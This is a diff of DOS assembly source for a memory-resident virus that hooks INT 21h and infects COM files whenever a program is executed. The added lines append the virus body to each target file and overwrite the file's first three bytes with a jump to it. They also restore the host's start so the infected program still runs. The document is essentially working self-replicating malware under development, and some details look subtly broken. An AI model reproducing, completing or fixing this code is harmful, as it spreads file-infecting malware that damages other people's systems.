@@ -21,7 +21,7 @@ get_delta:
      mov ax, 9a8ah    ; Are we in memory yet?
      int 21h          ; Call to int 21h
      cmp ax, 8b7bh    ; Is AX 8b7b?
-     je dont_install
+     je short dont_install
 
      ;jmp install
 alloc_mem:            ; We are in fact not in memory, lets relocate us away from here
@@ -83,9 +83,12 @@ install:
 
 dont_install:
      pop bp
-     mov ax, 4c00h    ; Terminate program
-     int 21h
-
+     add bp, data_section.start_of_host
+     mov si, bp
+     mov di, 100h
+     mov cx, 3
+     rep movsb
+     jmp 100h
 
 ;----------------
 ; This is the INT 21H HANDLER that will replace int 21h     
@@ -105,9 +108,9 @@ new_int21:
      pop ax
 .what_func:
      cmp ax, 9a8ah        ; Loaded?
-     je send_msg          ; Report that we are in memory
+     je short send_msg          ; Report that we are in memory
      cmp ax, 4b00h        ; Load and Execute (Exec), function 0
-     je infect            ; On entry: DS:DX = ASCIIZ filename pointer
+     je short infect            ; On entry: DS:DX = ASCIIZ filename pointer
 .restore_state:
      pop bp
      popa
@@ -144,7 +147,7 @@ infect:               ; DS:DX = ASCIIZ Filename pointer
      int 21h          ; Calling int 21h
      pop bx           ; Restore BX too
      cmp word [data_section.MZ_BUF+bp], 'MZ'  ; Is it a MZ EXE file?
-     je .abort_infection ; Yes, abort the infection attempt
+     je short .abort_infection ; Yes, abort the infection attempt
      push bx          ; Save BX
 
                       ; Since we have now determined that the program in question is not an EXE file, but a COM file instead, we will infect it
@@ -156,7 +159,8 @@ infect:               ; DS:DX = ASCIIZ Filename pointer
      int 21h          ; Calling int 21h
      pop bx
      cmp ax, 65436-virus_size   ; Is the file too big??
-     jae .abort_infection
+     jae short .abort_infection
+     mov [data_section.host_size+bp], ax
      push bx          ; Nope, perfetto sizo. BX = File handle
 
 
@@ -173,23 +177,90 @@ infect:               ; DS:DX = ASCIIZ Filename pointer
      add bp, data_section.shine_buf
      mov si, bp       ; Pointer to the "Shine" buffer
      pop bp
+     push bp
      mov di, si
      add di, 5
      mov cx, 5
      rep cmpsb       ; Is EOF = 'Shine'?
      jz .abort_infection  ; Yes, abort infection
      push bx         ; Nope, let's infect this bad boy             
+
+     ; We need to append the virus to the end of the program 
+     mov ax, 4202h    ; Function 42h (Move File Pointer), sub-function 02h (Signed offset from end of file)
      pop bx
+     push bx          ; BX = File Handle
+     xor cx, cx       ; CX = 0
+     mov dx, 0        ; DX = 0
+     int 21h          ; Calling int 21h
+     pop bx  
+     pop bp
+
+     push bx
+     push bp
+     mov ax, 4000h     ; Function 40h (Write file or device)
+     mov cx, virus_size
+     push ds
+     push cs
+     pop ds
+     mov dx, bp
+     int 21h
+     pop ds
+     pop bp
+     pop bx
+
+     push bp
+     mov ax, 4200h    ; Function 42h (Move File Pointer), sub-function 02h (Absolute offset from start of file)
+     push bx          ; BX = File Handle
+     xor cx, cx       ; CX = 0
+     mov dx, 0        ; DX = 0
+     int 21h          ; Calling int 21h
+     pop bx
+     pop bp
+
+     mov ax, 3f00h    ; Read file or device
+     mov cx, 3        ; Read 3 bytes, this case from the start
+     push bx
+     push bp          ; Save BP
+     add bp, data_section.start_of_host ; 
+     mov dx, bp       ; Pointer to the "start buffer"
+     int 21h          ; Calling int 21h
+     pop bp
+     pop bx
+     
+     push bp
+     mov ax, 4200h    ; Function 42h (Move File Pointer), sub-function 02h (Absolute offset from start of file)
+     push bx          ; BX = File Handle
+     xor cx, cx       ; CX = 0
+     xor dx, dx       ; DX = 0
+     int 21h          ; Calling int 21h
+     pop bx
+     pop bp
+     
+     mov ax, 4000h
+     push bx
+     push bp
+     add bp, data_section.jump_to_virus
+     mov dx, bp
+     mov cx, 3
+     int 21h
+     pop bp
+     pop bx
+
+
 
 .abort_infection:
      pop bp
      popa
-     jmp new_int21.call_int21
+     jmp short new_int21.call_int21
+
 
 
 
 data_section:
+     .start_of_host db 3
      .delta_off dw 0
+     .jump_to_virus db 0E9h
+     .host_size dw 0
      .MZ_BUF dw 0
      .shine_buf db '     '
      .file_infected db 'Shine'
